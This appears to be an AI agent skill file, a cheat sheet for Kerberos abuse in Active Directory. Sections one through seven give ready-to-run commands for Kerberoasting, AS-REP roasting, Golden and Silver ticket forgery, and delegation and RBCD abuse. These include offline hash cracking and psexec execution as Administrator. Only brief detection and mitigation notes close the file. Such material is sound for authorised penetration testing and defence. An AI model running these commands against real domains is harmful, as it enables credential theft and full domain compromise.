---
name: kerberos-abuse
description: Kerberoasting, AS-REP Roasting, Golden/Silver Ticket, delegation abuse.
---

# Kerberos Abuse Techniques

## 1. Kerberoasting

```bash
# Request TGS tickets for service accounts
impacket-GetUserSPNs domain/user:password -request -dc-ip dc_ip -outputfile tickets.txt

# Crack offline
hashcat -m 13100 tickets.txt wordlist.txt
# or
john --wordlist=wordlist.txt tickets.txt

# Use cracked password
impacket-psexec domain/svc_sql:cracked_pass@target
```

## 2. AS-REP Roasting

```bash
# Find accounts with "Do not require preauthentication"
impacket-GetNPUsers domain/ -dc-ip dc_ip -usersfile users.txt -outputfile asrep.txt

# Crack
hashcat -m 18200 asrep.txt wordlist.txt
```

## 3. Golden Ticket

```bash
# Requires: krbtgt NTLM hash + domain SID
impacket-ticketer -nthash krbtgt_hash -domain-sid S-1-5-21-... -domain domain.local Administrator

export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass domain/administrator@dc.domain.local
```

## 4. Silver Ticket

```bash
# Requires: Service account NTLM hash + SPN
impacket-ticketer -nthash svc_hash -domain-sid S-1-5-21-... -domain domain.local -spn cifs/target.domain.local Administrator

export KRB5CCNAME=Administrator.ccache
impacket-smbclient -k -no-pass target.domain.local
```

## 5. Unconstrained Delegation

```bash
# Find computers with unconstrained delegation
ldapsearch -x -H ldap://dc_ip -D "domain\user" -w pass -b "DC=domain,DC=local" "(userAccountControl:1.2.840.113556.1.4.803:=8192)" dn

# Capture TGTs
# Use Rubeus on Windows
Rubeus.exe monitor /interval:5 /nowrap
```

## 6. Constrained Delegation

```bash
# Find accounts with constrained delegation
impacket-findDelegation domain/user:password

# Abuse via S4U
impacket-getST -spn cifs/target.domain.local -impersonate Administrator domain/svc_account:password
```

## 7. Resource-Based Constrained Delegation (RBCD)

```bash
# Requires: WriteDACL or GenericWrite on computer object
# 1. Create new machine account
impacket-addcomputer domain/user:password -computer-name 'FAKE01$' -computer-pass 'Password123'

# 2. Set msDS-AllowedToActOnBehalfOfOtherIdentity
python3 rbcd.py domain/user:password -delegate-from 'FAKE01$' -delegate-to 'TARGET$' -action write -dc-ip dc_ip

# 3. Get ticket
impacket-getST -spn cifs/target.domain.local -impersonate Administrator domain/'FAKE01$':'Password123'

# 4. Use ticket
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass target.domain.local
```

## 8. Detection

| Technique | Event ID | Log Source |
|-----------|----------|------------|
| Kerberoasting | 4769 (TGS request) | Security |
| AS-REP Roasting | 4768 (TGT without preauth) | Security |
| Golden Ticket | 4769 (TGS with forged) | Security |
| Silver Ticket | 4624 (anomalous logon) | Security |

## 9. Mitigations

- Strong passwords for service accounts (30+ chars)
- Group Managed Service Accounts (gMSA)
- Disable unconstrained delegation
- Monitor for ticket requests
- Regular password rotation
